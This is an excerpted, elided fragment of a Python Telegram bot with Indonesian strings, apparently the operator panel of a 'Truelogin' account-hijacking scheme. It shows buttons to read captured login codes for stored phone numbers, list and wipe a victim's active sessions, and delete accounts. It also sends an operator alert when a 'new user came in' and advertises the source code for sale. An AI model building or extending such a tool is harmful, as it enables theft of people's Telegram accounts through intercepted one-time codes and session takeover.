...
def btnSpecificUsers(phonenumber):
    btn = [
        [Button.inline("AMBIL CODE",f"readcode-{phonenumber}")],
        [Button.inline("BUANG NOMOR",f"deleteThis-{phonenumber}")],
        [
            Button.inline("Perangkat",f"listsession-{phonenumber}"),
            Button.inline("❌ Hapus","delete")
        ]
    ]
...
async def handle_new_message(event):
    if event.is_private:
        ...
        if SENDER == be.id:
            ...
            if len(split) == 1 and len(text) < 20:
                ...
                try:
                    ...
                    await notif(f"User Baru Masuk Bosku! {name}")
        ...
        else: await event.respond("Hubungi : @mulaikosi untuk membeli source code Truelogin.\n\nAtau jika anda ingin membuat web truelogin telegram")
...
async def callback_handler(event):
    ...
    if callback_data.startswith("getUser:"):
        ...
        except: await event.answer("Tidak dapat menghapus pesan")
        ...
        if method in urelated:
            ...
            if callback_data.startswith("deleteThis-"):
                ...
                await event.edit(f"AKUN `{no_hpx}` TELAH DIHAPUS")
                    ...
                    if callback_data.startswith("accountInfo-"):
                        ...
                        for messe in msg:
                            ...
                            if OTPCODE:
                                ...
                                await event.edit(f"**Kode Masuk Anda :** `{OTPCODE.group(0)}`\n**Kode Diterima :** {messe.date} (UTC)\n\n**Updated :** {todate(time.time())}", buttons=BTX)
                                break
                        ...
                        btn.append(sbtn)
                        btn.append([Button.inline("HAPUS SEMUA SESI AKTIF",f"clearAllSession-{phonenumber}")])
                        btn.append([Button.inline("< KEMBALI", f"accountInfo-{phonenumber}"),btn_delete])
                        btn.append([Button.inline("HAPUS DATA", f"deleteThis-{phonenumber}")])
